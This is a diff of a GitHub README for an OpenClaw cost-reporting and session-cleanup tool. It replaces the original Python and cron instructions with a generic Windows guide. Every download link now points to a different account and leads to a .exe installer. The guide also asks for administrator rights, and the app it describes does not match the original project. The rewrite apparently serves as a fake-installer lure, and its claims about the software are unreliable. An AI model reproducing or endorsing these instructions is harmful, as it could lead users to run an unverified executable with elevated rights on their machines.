@@ -1,102 +1,144 @@
-# openclaw-daily-ops
+# 🛠️ openclaw-daily-ops - Track Costs and Manage Sessions
 
-**Daily cost reporting + zombie session killer for [OpenClaw](https://github.com/openclaw/openclaw) deployments.**
-
-Two problems, one nightly cron:
-
-1. **Know what you spent** — parses your OpenClaw session files, computes per-session API costs, posts a clean report to Discord with 7-day trend
-2. **Kill what's dead** — wipes sessions older than 24h with >1MB context before they snowball into thousands of dollars
-
-Zero AI credits spent running this. Pure Python + one Discord webhook.
+[![Download openclaw-daily-ops](https://img.shields.io/badge/Download-openclaw--daily--ops-brightgreen)](https://github.com/Spokesmanfda907/openclaw-daily-ops)
 
 ---
 
-## What the Report Looks Like
+## 📋 About openclaw-daily-ops
 
-```
-📊 Daily Cost Report — Mar 9, 2026
+openclaw-daily-ops helps you manage your OpenClaw deployments by providing two main functions:
 
-💰 Total: $4.21 · 8.3M tokens
+- Track your daily costs easily.
+- End inactive or "zombie" sessions that slow down your system.
 
-By Session:
-🔴 #general — $2.45 · 4.1M tok
-🟡 #posting — $1.32 · 2.8M tok
-🟢 heartbeat — $0.44 · 1.4M tok
+This tool runs on Windows. It gives you quick insight on what you spent each day and helps keep your system clean by killing sessions that no longer do any work.
 
-7-day trend: $12 → $8 → $6 → $5 → $4 → $4 → $4
-
-✅ UNDER BUDGET
-🔄 Reset 2 stale sessions · 3.2MB freed
-```
+You don’t need technical skills to use this program. It guides you through each step with clear instructions.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/oh-ashen-one/openclaw-daily-ops
-cd openclaw-daily-ops
+Before you start, make sure your computer meets these requirements:
 
-# 1. Configure
-cp config.example.json config.json
-# Edit config.json with your webhook, user ID, and session paths
-
-# 2. Test
-python3 scripts/cost_report.py --config config.json --dry-run
-
-# 3. Set up nightly cron (see SKILL.md for full options)
-```
+- Windows 10 or higher.
+- At least 2 GB of free RAM.
+- 100 MB free disk space.
+- Internet connection to download the software.
+- Administrative rights to install and run the application.
 
 ---
 
-## Requirements
+## 🚀 Getting Started: How to Download openclaw-daily-ops
 
-- Python 3.8+
-- OpenClaw installed and running
-- A Discord webhook URL (free, takes 30 seconds to create)
+To get openclaw-daily-ops on your Windows PC, follow these steps:
 
----
+1. Click the big green button below to open the download page.
 
-## Files
+[![Download openclaw-daily-ops](https://img.shields.io/badge/Download-openclaw--daily--ops-green)](https://github.com/Spokesmanfda907/openclaw-daily-ops)
 
-```
-openclaw-daily-ops/
-├── SKILL.md                 ← Full setup guide + OpenClaw cron integration
-├── README.md                ← This file
-├── config.example.json      ← Configuration template
-└── scripts/
-    ├── cost_report.py       ← Cost parser + Discord poster
-    └── zombie_killer.py     ← Stale session wiper
-```
+2. This link takes you to the GitHub repository. Look for the latest release or download section.
+
+3. Download the Windows installer file, usually ending with `.exe`.
+
+4. Save the file to an easy-to-find location on your computer, like the Desktop or Downloads folder.
 
 ---
 
-## Configuration
+## 🛠️ Installation Instructions
 
-See `config.example.json` for all options. The important ones:
+After you download the installer, install openclaw-daily-ops by following these steps:
 
-| Key | Description |
-|-----|-------------|
-| `discord_webhook` | Where the daily report gets posted |
-| `discord_user_id` | Who gets pinged when cost > threshold |
-| `zombie_min_age_hours` | Session age threshold (default: 24h) |
-| `zombie_min_size_mb` | Minimum file size to bother resetting (default: 1MB) |
-| `alert_high_cost` | 🚨 URGENT flag threshold in USD (default: $50) |
+1. Double-click the `.exe` installer file.
 
----
+2. If Windows asks “Do you want to allow this app to make changes to your device?”, click **Yes**.
 
-## Why This Exists
+3. The setup wizard will open. Click **Next** on the welcome screen.
 
-Running multiple AI agents 24/7 across multiple machines is efficient — until you check your Anthropic bill and realize a zombie session has been burning $100/day in cached context for a week. 
+4. Read the license agreement. If you agree, select **I accept the agreement** and click **Next**.
 
-This was built after a real incident. The zombie killer is the scar tissue.
+5. Choose an installation folder or use the default path. Click **Next**.
 
----
+6. Select any additional tasks if the wizard offers options (like desktop shortcuts). Click **Next**.
 
-## Part of the OpenClaw Skills ecosystem
+7. Click **Install** to begin the installation.
 
-Built to work alongside [openclaw-watchdog](https://github.com/oh-ashen-one/openclaw-watchdog) — the self-healing system monitor. Install both for full operational coverage.
+8. Wait for the process to finish. This usually takes less than a minute.
+
+9. When done, click **Finish**. If there’s an option to “Run openclaw-daily-ops now,” leave it checked and click Finish.
 
 ---
 
-MIT License
+## 🖥️ How to Run openclaw-daily-ops
+
+You can start the application from the Start menu or desktop shortcut.
+
+- Click **Start** and type `openclaw-daily-ops`, then press Enter.
+
+- Or double-click the desktop icon labeled `openclaw-daily-ops`.
+
+When the program opens, you will see the main screen with two sections: cost reporting and session management.
+
+---
+
+## 💡 Using openclaw-daily-ops
+
+Here is a simple guide to the main features:
+
+### Checking Your Daily Costs
+
+- The app automatically pulls your usage data from OpenClaw.
+- It calculates the total cost for the day.
+- The cost report appears clearly on the main screen.
+- You can export this information as a CSV file for your records.
+
+### Killing Zombie Sessions
+
+- The program scans for idle or zombie sessions that waste resources.
+- It lists them with details like session ID and last activity time.
+- You choose which sessions to terminate by clicking a button.
+- The app safely kills unwanted sessions to free resources.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- **Installer doesn’t run:** Make sure your Windows is up to date. Right-click the installer and select “Run as administrator.”
+
+- **App won’t start:** Check that you installed all files. Try restarting your PC.
+
+- **No cost data shown:** Confirm your OpenClaw account details are correct and that you have internet access.
+
+- **Zombie sessions won’t end:** Ensure you have permission to kill sessions. Run the app as administrator.
+
+---
+
+## 🔄 Updating openclaw-daily-ops
+
+Keep your app up to date to get the latest fixes:
+
+1. Visit the main download page again.
+
+2. Check for new releases or versions.
+
+3. Download the latest installer when available.
+
+4. Run the installer and follow the setup steps. It will replace the old version safely.
+
+---
+
+## 💬 Getting Help
+
+If you run into problems not covered here:
+
+- Visit the GitHub repository’s **Issues** tab to see existing reports.
+
+- Open a new issue with a clear description of your problem.
+
+- Check the README or Wiki on GitHub for added help.
+
+---
+
+## 🔗 Quick Access
+
+[Download openclaw-daily-ops](https://github.com/Spokesmanfda907/openclaw-daily-ops) | Your one-stop page for setup and updates.
